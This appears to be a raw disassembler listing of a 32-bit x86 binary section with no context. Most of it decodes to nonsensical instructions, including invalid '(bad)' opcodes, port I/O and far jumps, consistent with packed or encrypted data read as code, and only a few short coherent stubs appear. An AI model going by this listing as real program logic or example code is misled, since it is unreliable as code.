  40c7bb:	xor    ebp,DWORD PTR [ebx]
  40c7bd:	shl    bl,cl
  40c7bf:	stc    
  40c7c0:	icebp  
  40c7c1:	xchg   edi,eax
  40c7c2:	daa    
  40c7c3:	mov    edi,0x13f86c5
  40c7c8:	ja     0x40c789
  40c7ca:	mov    esp,0x7994f75b
  40c7cf:	fwait
  40c7d0:	or     esi,DWORD PTR [esi+0x2b]
  40c7d3:	mov    al,ds:0xfca30534
  40c7d8:	repz sub eax,eax
  40c7db:	inc    ecx
  40c7dc:	in     al,0x15
  40c7de:	xchg   ebx,eax
  40c7df:	mov    ecx,0xb89a5213
  40c7e4:	mov    ecx,0xbabfab64
  40c7e9:	pop    esi
  40c7ea:	fild   QWORD PTR [ebp+0x30e3dadb]
  40c7f0:	jae    0x40c785
  40c7f2:	xor    eax,0x811c19fd
  40c7f7:	adc    ah,BYTE PTR [eax]
  40c7f9:	loope  0x40c78c
  40c7fb:	lock fs jmp 0x40c784
  40c7ff:	pop    esi
  40c800:	inc    ebx
  40c801:	fmul   QWORD PTR [ebp+0xe]
  40c804:	scas   al,BYTE PTR es:[edi]
  40c805:	fbstp  TBYTE PTR [ebp+0x712fd0c5]
  40c80b:	sub    ch,BYTE PTR [ecx+0x2c3ab526]
  40c811:	ds sti 
  40c813:	push   ss
  40c814:	lea    eax,[esi-0x624a4760]
  40c81a:	xor    ah,BYTE PTR [ecx-0x3b58517e]
  40c820:	ins    BYTE PTR es:[edi],dx
  40c821:	fldlg2 
  40c823:	cmp    DWORD PTR [ecx+0x662e259a],esp
  40c829:	ss lock jge 0x40c83b
  40c82d:	lahf   
  40c82e:	stos   BYTE PTR es:[edi],al
  40c82f:	rcr    DWORD PTR [ebp+0x3fe2dd37],0x3f
  40c836:	fisubr WORD PTR [esi+0x4b]
  40c839:	push   ebx
  40c83a:	ins    BYTE PTR es:[edi],dx
  40c83b:	push   0xffffffc3
  40c83d:	fadd   st,st(0)
  40c83f:	mov    ecx,0x5ed2479a
  40c844:	push   ss
  40c845:	push   0x684dcce9
  40c84a:	xchg   ebx,eax
  40c84b:	or     eax,0xb7c59da9
  40c850:	adc    BYTE PTR [eax],bh
  40c852:	fstp   QWORD PTR [edi]
  40c854:	fs ja  0x40c7e9
  40c857:	retf   0x4fdd
  40c85a:	psraw  mm0,QWORD PTR [edi-0x5]
  40c85e:	push   eax
  40c85f:	fidivr DWORD PTR [edi+0x638d8cf1]
  40c865:	pusha  
  40c866:	inc    esp
  40c867:	test   BYTE PTR [edx+0x57],al
  40c86a:	int    0x8f
  40c86c:	fstp   TBYTE PTR [ecx-0x61]
  40c86f:	into   
  40c870:	cmp    al,0x54
  40c872:	in     al,dx
  40c873:	ret    
  40c874:	push   edi
  40c875:	xchg   ebx,eax
  40c876:	jl     0x40c875
  40c878:	xchg   BYTE PTR [eax+eax*4-0x13],ch
  40c87c:	iret   
  40c87d:	dec    ecx
  40c87e:	rol    DWORD PTR [ebp+ebx*2-0x46],cl
  40c882:	test   DWORD PTR [eax+0x48],eax
  40c885:	sbb    ebx,esp
  40c887:	push   esi
  40c888:	push   ebx
  40c889:	mov    eax,0x8bf9af36
  40c88e:	inc    ebp
  40c88f:	or     al,0x3
  40c891:	inc    ebp
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x71159f60
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c929
  40c8c7:	jo     0x40c874
  40c8c9:	pop    ds
  40c8ca:	or     bl,ah
  40c8cc:	icebp  
  40c8cd:	repnz mov edi,0x762cef3e
  40c8d3:	into   
  40c8d4:	outs   dx,DWORD PTR ds:[esi]
  40c8d5:	fidivr WORD PTR [edi+ebx*1+0x5f]
  40c8d9:	leave  
  40c8da:	xchg   edi,eax
  40c8db:	jge    0x40c902
  40c8dd:	leave  
  40c8de:	fs icebp 
  40c8e0:	pop    ss
  40c8e1:	mov    ebx,0xa443fd1
  40c8e6:	out    dx,eax
  40c8e7:	cdq    
  40c8e8:	mov    al,ch
  40c8ea:	sbb    DWORD PTR [edx-0x76],ebp
  40c8ed:	inc    ebx
  40c8ee:	dec    ebp
  40c8ef:	sub    DWORD PTR [esi-0x24],0xb8f25b87
  40c8f6:	aas    
  40c8f7:	retf   
  40c8f8:	mov    bx,0x1ae
  40c8fc:	lahf   
  40c8fd:	test   DWORD PTR [ecx+eiz*1-0x2b],ebp
  40c901:	jmp    0xda9ce34b
  40c906:	std    
  40c907:	cld    
  40c908:	push   ss
  40c909:	stc    
  40c90a:	add    esi,DWORD PTR [eax+0x65]
  40c90d:	(bad)  
  40c90e:	lock aas 
  40c910:	mov    ah,BYTE PTR [ebx-0x5d95f589]
  40c916:	and    eax,0xe9a5f0a0
  40c91b:	pop    ds
  40c91c:	les    esi,FWORD PTR [edi]
  40c91e:	ins    DWORD PTR es:[edi],dx
  40c91f:	gs shl ebx,cl
  40c922:	rcr    al,1
  40c924:	ds sub eax,0xae07b47e
  40c92a:	stos   DWORD PTR es:[edi],eax
  40c92b:	ror    dh,1
  40c92d:	inc    ebx
  40c92e:	adc    ebp,DWORD PTR [edi-0x3b]
  40c931:	pop    ebp
  40c932:	xchg   ebp,eax
  40c933:	mov    ebx,0x3ebac2d1
  40c938:	mov    ebp,0x4aeb1f80
  40c93d:	xor    BYTE PTR [ebx+eax*8+0x2a8d26f7],ch
  40c944:	std    
  40c945:	repnz mov cl,0x65
  40c948:	pop    esi
  40c949:	in     al,0xf1
  40c94b:	(bad)  
  40c94c:	in     al,0x5c
  40c94e:	rcr    DWORD PTR [edx-0x16],0xc5
  40c952:	mov    dh,0x87
  40c954:	test   BYTE PTR [edx-0x5d919c9c],0xba
  40c95b:	test   al,0xb7
  40c95d:	inc    edx
  40c95e:	iret   
  40c95f:	fbld   TBYTE PTR [edx-0x2fe77f19]
  40c965:	addr16 mov bh,0x20
  40c968:	pusha  
  40c969:	adc    DWORD PTR [eax-0x3b],esp
  40c96c:	jns    0x40c9d0
  40c96e:	retf   
  40c96f:	mov    ecx,0x883a74f5
  40c974:	into   
  40c975:	jae    0x40c9aa
  40c977:	aam    0x24
  40c979:	and    ch,bl
  40c97b:	pop    ebp
  40c97c:	and    eax,0x94595620
  40c981:	pop    esi
  40c982:	repz mov edx,0x373e506a
  40c988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c989:	out    0x6b,eax
  40c98b:	add    cl,BYTE PTR [edx]
  40c98d:	mov    ds:0x326650bf,eax
  40c992:	xor    edi,DWORD PTR [ebx-0x32e27a00]
  40c998:	adc    bl,BYTE PTR [esi+edx*4]
  40c99b:	scas   eax,DWORD PTR es:[edi]
  40c99c:	mov    edx,0xd10eb8d4
  40c9a1:	push   0xd1db09e9
  40c9a6:	jmp    0x676e:0xcaa9ac03
  40c9ad:	adc    DWORD PTR [edi-0x50021d9e],esp
  40c9b3:	xchg   DWORD PTR [edx],esp
  40c9b5:	mov    ds:0x603293b1,eax
  40c9ba:	sub    al,al
  40c9bc:	mov    esp,0xfb468216
  40c9c1:	xor    DWORD PTR [ecx],esp
  40c9c3:	dec    esi
  40c9c4:	xor    eax,0x8667b12e
  40c9c9:	fst    QWORD PTR [esi+0x7f]
  40c9cc:	push   eax
  40c9cd:	retf   
  40c9ce:	std    
  40c9cf:	mov    gs,WORD PTR ds:0xbe162dc8
  40c9d5:	hlt    
  40c9d6:	xchg   BYTE PTR [edi+0x60],al
  40c9d9:	push   es
  40c9da:	or     edi,DWORD PTR [eax+0xd8b8401]
  40c9e0:	lods   ax,WORD PTR ds:[esi]
  40c9e2:	mov    esi,0x7014c2b8
  40c9e7:	cmp    BYTE PTR [eax-0x691d0456],dh
  40c9ed:	cmp    al,0xf9
  40c9ef:	sti    
  40c9f0:	stc    
  40c9f1:	or     DWORD PTR [edx+0xb],ebp
  40c9f4:	cmp    eax,0x655e742
  40c9f9:	imul   edx,ebx,0xc7dae5ad
  40c9ff:	(bad)  
  40ca00:	mov    ds:0xc3d74b7d,al
  40ca05:	sahf   
  40ca06:	dec    edx
  40ca07:	dec    ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0x6d4a75cf
  40ca1c:	addr16 dec eax
  40ca1e:	hlt    
  40ca1f:	jle    0x40ca9f
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca23
  40ca26:	scas   al,BYTE PTR es:[edi]
  40ca27:	push   eax
  40ca28:	cmp    eax,0xaf3f93a5
  40ca2d:	xor    al,0xfe
  40ca2f:	adc    DWORD PTR [esi+0x3b],0x3fcde51e
  40ca36:	adc    bl,BYTE PTR [edi-0x48]
  40ca39:	dec    esi
  40ca3a:	cmp    al,0x9f
  40ca3c:	outs   dx,BYTE PTR ds:[esi]
  40ca3d:	mov    dh,BYTE PTR [ecx-0x45128ab8]
  40ca43:	inc    edx
  40ca44:	and    al,0x28
  40ca46:	mov    ecx,DWORD PTR [edi-0x693317ed]
  40ca4c:	retf   
  40ca4d:	push   ebp
  40ca4e:	and    DWORD PTR [edi],edi
  40ca50:	arpl   WORD PTR [eax-0x64e9ae4c],cx
  40ca56:	jne    0x40ca57
  40ca58:	add    BYTE PTR [edi],bh
  40ca5a:	dec    eax
  40ca5b:	sub    BYTE PTR [edi-0x6a49e1eb],dh
  40ca61:	push   ds
  40ca62:	in     eax,0x4e
  40ca64:	cmc    
  40ca65:	popf   
  40ca66:	and    ch,BYTE PTR [ecx]
  40ca68:	(bad)  
  40ca6a:	repnz int 0x6e
  40ca6d:	das    
  40ca6e:	hlt    
  40ca6f:	rcr    BYTE PTR [edx+0x34],cl
  40ca72:	adc    bh,BYTE PTR [ecx+edi*2-0x70]
  40ca76:	push   ebp
  40ca77:	enter  0x39a0,0xb4
  40ca7b:	das    
  40ca7c:	retf   0x4f27
  40ca7f:	lods   eax,DWORD PTR ds:[esi]
  40ca80:	out    dx,al
  40ca81:	xchg   edx,eax
  40ca82:	in     eax,0x7e
  40ca84:	fdivr  st,st(7)
  40ca86:	sbb    DWORD PTR [ebx+0x7d7fe7f9],esp
  40ca8c:	jno    0x40ca7c
  40ca8e:	lahf   
  40ca8f:	jecxz  0x40caec
  40ca91:	jl     0x40ca53
  40ca93:	xor    bl,BYTE PTR [ebp-0x79]
  40ca96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca97:	(bad)  
  40ca98:	push   0x6b
  40ca9a:	call   0xbb1e:0x2c15713c
  40caa1:	jle    0x40ca2b
  40caa3:	test   BYTE PTR [edi+0x10bda1d9],ch
  40caa9:	mov    ebx,DWORD PTR [ecx]
  40caab:	mov    edx,DWORD PTR ds:0x7cf26e3
  40cab1:	inc    esi
  40cab2:	(bad)  
  40cab3:	dec    ecx
  40cab4:	mov    al,0x2f
  40cab6:	(bad)  
  40cab8:	cmp    BYTE PTR [edx+0x18],ch
  40cabb:	out    dx,eax
  40cabc:	push   ebp
  40cabd:	dec    esp
  40cabe:	inc    edx
  40cabf:	xchg   esp,eax
  40cac0:	mov    ch,0x87
  40cac2:	add    al,0x58
  40cac4:	imul   ebx,DWORD PTR [ebx+edx*1+0x7f31a518],0x1cf26ca5
  40cacf:	xor    eax,0x17acfaee
  40cad4:	ins    DWORD PTR es:[edi],dx
  40cad5:	adc    DWORD PTR ds:0xbf3fd648,edi
  40cadb:	and    al,0xe0
  40cadd:	jg     0x40ca81
  40cadf:	inc    eax
  40cae0:	hlt    
  40cae1:	mov    ebp,0xf0b972a2
  40cae6:	xchg   edi,eax
  40cae7:	pushf  
  40cae8:	pop    esp
  40cae9:	lods   eax,DWORD PTR ds:[esi]
  40caea:	repnz inc ebp
  40caec:	push   esi
  40caed:	sbb    BYTE PTR [ebx-0x32],ch
  40caf0:	(bad)  
  40caf1:	nop
  40caf2:	push   ecx
  40caf3:	int3   
  40caf4:	xlat   BYTE PTR ds:[ebx]
  40caf5:	es sahf 
  40caf7:	xchg   ebx,eax
  40caf8:	push   ebx
  40caf9:	popa   
  40cafa:	in     eax,0x21
  40cafc:	stos   DWORD PTR es:[edi],eax
  40cafd:	jp     0x40cb4a
  40caff:	sbb    eax,0xdd97f81
  40cb04:	cmp    ch,BYTE PTR [ebx]
  40cb06:	repz xchg ecx,eax
  40cb08:	inc    ebx
  40cb09:	(bad)  [ecx+eax*1]
  40cb0c:	dec    esp
  40cb0d:	popa   
  40cb0e:	push   0x2898b539
  40cb13:	arpl   WORD PTR [ebp-0x50],cx
  40cb16:	xlat   BYTE PTR ds:[ebx]
  40cb17:	inc    ebx
  40cb18:	jmp    0x9b6b3e06
  40cb1d:	int    0x8b
  40cb1f:	mov    al,0x2a
  40cb21:	pop    ds
  40cb22:	dec    ebx
  40cb23:	push   0xffffffb0
  40cb25:	mov    DWORD PTR [edi+0x85662e2],ebx
  40cb2b:	xchg   ecx,eax
  40cb2c:	sahf   
  40cb2d:	out    0x6b,al
  40cb2f:	fldenv [ecx]
  40cb31:	retf   
  40cb32:	retf   
  40cb33:	leave  
  40cb34:	(bad)  [ecx+0x5c]
  40cb37:	js     0x40cb18
  40cb39:	popa   
  40cb3a:	pushf  
  40cb3b:	or     al,BYTE PTR [ecx]
  40cb3d:	fdivr  st,st(5)
  40cb3f:	lea    ebx,[edi+0x52345b2a]
  40cb45:	lds    edi,FWORD PTR [ecx]
  40cb47:	inc    esp
  40cb48:	pop    ss
  40cb49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4a:	inc    edx
  40cb4b:	dec    BYTE PTR [edx+0x43]
  40cb4e:	sub    eax,0xd6aa1983
  40cb53:	cmp    cl,al
  40cb55:	pop    eax
  40cb56:	sbb    eax,0x8564891e
  40cb5b:	push   ebp
  40cb5c:	pushf  
  40cb5d:	mov    ds:0x4b15186,eax
  40cb62:	imul   esi,DWORD PTR [ebx+eax*8+0x36],0x5b
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cbd0
  40cb8b:	loope  0x40cbe1
  40cb8d:	test   BYTE PTR [ecx],cl
  40cb8f:	idiv   BYTE PTR [esi+0x7e]
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb91
  40cb97:	jl     0x40cc05
  40cb99:	lock sbb edi,DWORD PTR [eax+ebp*8-0x3a64d7ec]
  40cba1:	jmp    0x561f:0x470c9e8b
  40cba8:	leave  
  40cba9:	out    0x11,eax
  40cbab:	addr16 mov ebx,0xbb099b52
  40cbb1:	add    ah,ch
  40cbb3:	mov    esi,0xba7f4bc9
  40cbb8:	cdq    
  40cbb9:	dec    esi
  40cbba:	lds    ebx,FWORD PTR [edx+0x7f71111a]
  40cbc0:	nop
  40cbc1:	neg    ecx
  40cbc3:	xchg   edi,eax
  40cbc4:	cwde   
  40cbc5:	mov    ch,BYTE PTR [ebx+0x349a1687]
  40cbcb:	adc    al,0xd
  40cbcd:	mov    ah,0xd3
  40cbcf:	daa    
  40cbd0:	ins    DWORD PTR es:[edi],dx
  40cbd1:	in     al,0x45
  40cbd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbd4:	mov    WORD PTR [edi],?
  40cbd6:	push   0xffffff9c
  40cbd8:	pop    edi
  40cbd9:	mov    dh,0x8e
  40cbdb:	rcr    eax,1
  40cbdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbde:	repz cmp cl,BYTE PTR [edx+0x65]
  40cbe2:	int    0x6
  40cbe4:	push   ss
  40cbe5:	mov    edx,0xdbc09522
  40cbea:	mov    cs,WORD PTR [edx]
  40cbec:	xor    DWORD PTR [eax-0x19],ebp
  40cbef:	fucomip st,st(4)
  40cbf1:	jb     0x40cb7c
  40cbf3:	out    dx,al
  40cbf4:	dec    eax
  40cbf5:	mov    dh,0xd7
  40cbf7:	adc    BYTE PTR [edi+0x63],ch
  40cbfa:	in     eax,dx
  40cbfb:	pop    ebp
  40cbfc:	shl    BYTE PTR [edi],1
  40cbfe:	fistp  DWORD PTR [ebx-0x63]
  40cc01:	call   0x85e8182b
  40cc06:	xchg   esi,eax
  40cc07:	adc    eax,0x53dfdc48
  40cc0c:	adc    bl,bl
  40cc0e:	aas    
  40cc0f:	mov    al,0x6a
  40cc11:	ds repz inc ecx
  40cc14:	push   ds
  40cc15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc16:	imul   DWORD PTR [edi+0x27]
  40cc19:	les    esp,FWORD PTR [ebp*8+0x5c35a886]
  40cc20:	inc    edx
  40cc21:	mov    esp,0x5b39a6ee
  40cc26:	mov    edx,0x462473d
  40cc2b:	stc    
  40cc2c:	in     al,0x1c
  40cc2e:	jno    0x40cbbe
  40cc30:	loop   0x40cbc5
  40cc32:	inc    BYTE PTR [ecx+ecx*1-0x16ec2eda]
  40cc39:	jb     0x40cc5a
  40cc3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc3c:	lods   al,BYTE PTR ds:[esi]
  40cc3d:	gs jns 0x40cc4d
  40cc40:	push   esi
  40cc42:	and    BYTE PTR [ebx+0x4d],dl
  40cc45:	pop    ebx
  40cc46:	sbb    al,0x10
  40cc48:	rcr    dl,0x8e
  40cc4b:	inc    edx
  40cc4c:	sbb    BYTE PTR ds:0xbea9a052,bh
  40cc52:	xlat   BYTE PTR ds:[ebx]
  40cc53:	cdq    
  40cc54:	add    eax,0x1d68f25e
  40cc59:	mov    ecx,0x6d6f9178
  40cc5e:	and    al,0x83
  40cc60:	adc    DWORD PTR [edx+0x78],0x38
  40cc64:	call   0x288e3294
  40cc69:	test   BYTE PTR [eax-0x2],0xf2
  40cc6d:	pop    esp
  40cc6e:	push   edx
  40cc6f:	cdq    
  40cc70:	and    al,0xee
  40cc72:	fsubr  QWORD PTR [edx-0x7dea8158]
  40cc78:	jmp    0x40cc84
  40cc7a:	cmp    BYTE PTR [edi-0x4b],bl
  40cc7d:	jo     0x40cc5a
  40cc7f:	es pushf 
  40cc81:	mov    cl,0xb5
  40cc83:	jno    0x40cc36
  40cc85:	inc    eax
  40cc86:	add    ch,BYTE PTR [esi+0x5fe6c94e]
  40cc8c:	jmp    0x40cc8e
  40cc8e:	mov    ch,0x40
  40cc90:	xchg   ebx,eax
  40cc91:	lods   eax,DWORD PTR ds:[esi]
  40cc92:	imul   esp,DWORD PTR [esi-0xf],0x3b
  40cc96:	and    ch,BYTE PTR [edx-0x5add0a27]
  40cc9c:	add    bh,BYTE PTR [edx+0x5efc5ced]
  40cca2:	out    0xb,al
  40cca4:	cmp    eax,0x894da0df
  40cca9:	mov    edx,DWORD PTR [ebx-0x4]
  40ccac:	aad    0x83
  40ccae:	daa    
  40ccaf:	xchg   esi,eax
  40ccb0:	(bad)  
  40ccb1:	(bad)  
  40ccb2:	outs   dx,DWORD PTR ds:[esi]
  40ccb3:	aam    0xde
  40ccb5:	stos   DWORD PTR es:[edi],eax
  40ccb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccb7:	fbld   TBYTE PTR [edi-0x69d80fbe]
  40ccbd:	adc    al,0x12
  40ccbf:	adc    DWORD PTR [eax+ebx*1],ebp
  40ccc2:	dec    ebp
  40ccc3:	test   al,0xb1
  40ccc5:	loopne 0x40cc69
  40ccc7:	pop    edx
  40ccc8:	dec    edx
  40ccc9:	minps  xmm1,XMMWORD PTR [edi-0x659a4eda]
  40ccd0:	cwde   
  40ccd1:	push   ss
  40ccd2:	ror    BYTE PTR [eax],1
  40ccd4:	aad    0x64
  40ccd6:	mov    dl,0x8b
  40ccd8:	inc    ebp
  40ccd9:	cld    
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x97ec1d3a
  40ccf1:	int3   
  40ccf2:	cmc    
  40ccf3:	pusha  
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cc97
  40ccfd:	neg    ebp
  40ccff:	sbb    al,0xbd
  40cd01:	aas    
  40cd02:	and    al,0x4
  40cd04:	outs   dx,DWORD PTR ds:[esi]
  40cd05:	mov    ecx,0xa4ea7b72
  40cd0a:	sbb    al,0xf6
  40cd0c:	fs cs retf 0x64ba
  40cd11:	ja     0x40cd8d
  40cd13:	dec    ebx
  40cd14:	aaa    
  40cd15:	xor    eax,0xa9f9a943
  40cd1a:	xchg   ecx,eax
  40cd1b:	mov    bl,0x90
  40cd1d:	test   al,0x2
  40cd1f:	mov    ecx,ecx
  40cd21:	push   ebp
  40cd22:	clc    
  40cd23:	popa   
  40cd24:	test   al,0xeb
  40cd26:	mov    esi,DWORD PTR [esi]
  40cd28:	and    al,ch
  40cd2a:	out    dx,al
  40cd2b:	add    al,0x9d
  40cd2d:	gs jbe 0x40cd0f
  40cd30:	mov    esi,0xb9a30d16
  40cd35:	mov    edi,0x84a0aab
  40cd3a:	and    eax,0xe455e107
  40cd3f:	lock (bad) 
  40cd41:	mov    eax,0x7d9456fd
  40cd46:	je     0x40cd10
  40cd48:	call   0x47f1ecd2
  40cd4d:	mov    cl,0x49
  40cd4f:	(bad)  
  40cd50:	cmp    al,0x68
  40cd52:	push   esp
  40cd53:	mov    gs,WORD PTR [ebx+0x5dea31e2]
  40cd59:	in     al,0x40
  40cd5b:	call   0x707f:0x5db4ae43
  40cd62:	shl    DWORD PTR [ebx],1
  40cd64:	ficom  WORD PTR [ebx-0x73bc642e]
  40cd6a:	inc    ebp
  40cd6b:	xor    eax,DWORD PTR [edx]
  40cd6d:	enter  0x50a7,0xf7
  40cd71:	leave  
  40cd72:	sbb    BYTE PTR [ecx-0x24388139],0x4e
  40cd79:	shl    BYTE PTR [ebx-0xa2357af],0x94
  40cd80:	test   al,0x2d
  40cd82:	push   eax
  40cd83:	mov    esi,0xe0e34200
  40cd88:	inc    BYTE PTR [edi-0x12]
  40cd8b:	call   0xdfba:0x876be172
  40cd92:	lea    esp,[ebp+0x49fd7c9e]
  40cd98:	mov    ebx,0x6fa44f01
  40cd9d:	sbb    ebp,DWORD PTR [ebp-0x41e27a65]
  40cda3:	in     al,dx
  40cda4:	imul   edi,eax,0xffffffe3
  40cda7:	test   BYTE PTR [ebp-0x4270b3ec],al
  40cdad:	jle    0x40cd6f
  40cdaf:	mov    edx,0x7c1d2f55
  40cdb4:	addr16 call 0x79ac5720
  40cdba:	nop
  40cdbb:	int3   
  40cdbc:	test   DWORD PTR [edi],0xa3d30e83
  40cdc2:	or     BYTE PTR [ebx-0x50],bl
  40cdc5:	dec    esp
  40cdc6:	gs jge 0x40cd51
  40cdc9:	mov    esi,0x425c1fac
  40cdce:	or     BYTE PTR [eax+esi*1-0x687f222c],dh
  40cdd5:	xor    DWORD PTR [edi],edi
  40cdd7:	sub    dh,BYTE PTR [ecx+0x16]
  40cdda:	pop    esi
  40cddb:	inc    edi
  40cddc:	adc    BYTE PTR [ecx],cl
  40cdde:	adc    al,0xc1
  40cde0:	fucomp st(1)
  40cde2:	xchg   BYTE PTR [ebx-0x44e6685d],al
  40cde8:	pop    edx
  40cde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdea:	add    al,0x2
  40cdec:	jnp    0x40cd82
  40cdee:	leave  
  40cdef:	sbb    edi,eax
  40cdf1:	shl    BYTE PTR [ecx-0x5faf88b0],0x16
  40cdf8:	stos   BYTE PTR es:[edi],al
  40cdf9:	outs   dx,BYTE PTR ds:[esi]
  40cdfa:	es xchg esi,eax
  40cdfc:	and    BYTE PTR [ebx],ch
  40cdfe:	loopne 0x40cd9e
  40ce00:	gs sar bh,cl
  40ce03:	cmp    ecx,edx
  40ce05:	or     ch,0xf
  40ce08:	xlat   BYTE PTR ds:[ebx]
  40ce09:	xor    edi,DWORD PTR [edi]
  40ce0b:	xchg   esp,eax
  40ce0c:	and    dl,bl
  40ce0e:	mov    ah,0x89
  40ce10:	push   edx
  40ce11:	arpl   WORD PTR [edi+0x7],cx
  40ce14:	(bad)  
  40ce15:	dec    ebp
  40ce16:	jmp    0x8012:0x2ad97e7d
  40ce1d:	adc    BYTE PTR [eax+0x4bafcfb0],dl
  40ce23:	bound  ecx,QWORD PTR [edx-0xaab125b]
  40ce29:	xchg   ebx,eax
  40ce2a:	enter  0xf645,0xd7
  40ce2e:	mov    esi,0x6fbf42f0
  40ce33:	cmp    eax,0x1a6a2d65
  40ce38:	pop    es
  40ce39:	jl     0x40cdbf
  40ce3b:	test   eax,0xbac133b2
  40ce40:	popf   
  40ce41:	jb     0x40ce75
  40ce43:	add    BYTE PTR [ebx],al
  40ce45:	ret    0x59e9
  40ce48:	add    DWORD PTR [eax],eax
  40ce4a:	add    BYTE PTR [edx-0x52a4f329],dh
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0xcb65331,eax
  40ce59:	adc    eax,0x7e888b58
  40ce5e:	jle    0x40ce9f
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40cdf1
  40ce64:	sub    ebx,DWORD PTR [ecx-0x58]
  40ce67:	sbb    ebp,DWORD PTR [ecx+0x32]
  40ce6a:	xor    al,0xb1
  40ce6c:	mov    bh,0x8b
  40ce6e:	shl    DWORD PTR [esp+ecx*8],cl
  40ce71:	mov    esp,DWORD PTR [ecx-0x1e55acbb]
  40ce77:	mov    bh,0x80
  40ce79:	mov    BYTE PTR [esp+edx*1+0x1f],dl
  40ce7d:	adc    dh,BYTE PTR [ecx]
  40ce7f:	ins    BYTE PTR es:[edi],dx
  40ce80:	xor    BYTE PTR [ebx],0xdf
  40ce83:	xchg   esi,eax
  40ce84:	mov    ebx,0x78367820
  40ce89:	cld    
  40ce8a:	fs sahf 
  40ce8c:	les    eax,FWORD PTR [esp+edx*8+0x6b]
  40ce90:	lea    esi,[eax+0x4808ed71]
  40ce96:	ins    BYTE PTR es:[edi],dx
  40ce97:	gs jb  0x40cedf
  40ce9a:	push   esp
  40ce9b:	and    al,0xdb
  40ce9d:	pop    eax
  40ce9e:	fs (bad) 
  40cea0:	(bad)  
  40cea1:	sti    
  40cea2:	jmp    0x40ce8e
  40cea4:	jae    0x40ce94
  40cea6:	mov    eax,ds:0xf1acd8c9
  40ceab:	out    0xd6,al
  40cead:	outs   dx,DWORD PTR ds:[esi]
  40ceae:	or     al,0xc4
  40ceb0:	in     al,dx
  40ceb1:	pop    eax
  40ceb2:	mov    bl,0xf9
  40ceb4:	mov    dh,0xee
  40ceb6:	mov    eax,ds:0x1a9b9b13
  40cebb:	xchg   BYTE PTR [ebp+0x307bd80a],bh
  40cec1:	test   DWORD PTR [ecx+0x6d8f8abb],edx
  40cec7:	xchg   edx,eax
  40cec8:	cs ja  0x40ceba
  40cecb:	pusha  
  40cecc:	pop    ebx
  40cecd:	aaa    
  40cece:	mov    cl,0xf
  40ced0:	(bad)  
  40ced1:	cdq    
  40ced2:	mov    eax,DWORD PTR [ebp+0x2d88e09f]
  40ced8:	mov    al,0xec
  40ceda:	test   DWORD PTR [ebp+0x36ce1ff0],eax
  40cee0:	mov    ebp,0xc330eeea
  40cee5:	ret    
  40cee6:	inc    DWORD PTR [ebp-0x8]
  40cee9:	out    0xa5,al
  40ceeb:	sbb    BYTE PTR [ecx+0x44900735],ah
  40cef1:	mov    ebp,0x88dceed
  40cef6:	sub    al,0x36
  40cef8:	ins    BYTE PTR es:[edi],dx
  40cef9:	add    eax,0x771b78f2
  40cefe:	jecxz  0x40cf73
  40cf00:	sahf   
  40cf01:	push   edx
  40cf02:	inc    eax
  40cf03:	pushf  
  40cf04:	or     BYTE PTR [edi+0x30],bh
  40cf07:	mov    al,ds:0x9bf7b20f
  40cf0c:	call   0x8bc3:0x3838a874
  40cf13:	mov    eax,ds:0x748b6d62
  40cf18:	rcr    BYTE PTR [eax-0x5],1
  40cf1b:	test   al,0x84
  40cf1d:	sub    DWORD PTR [eax+0x232af6d5],eax
  40cf23:	aas    
  40cf24:	lea    ebx,[ecx+eiz*8+0x74]
  40cf28:	mov    bl,0x29
  40cf2a:	mov    edi,0xc0b940fb
  40cf2f:	xor    ch,dh
  40cf31:	enter  0x321c,0x59
  40cf35:	lds    ebx,FWORD PTR [edi+0x3]
  40cf38:	pop    ss
  40cf39:	dec    esp
  40cf3a:	xor    bl,ah
  40cf3c:	data16 mov al,ds:0x56674d12
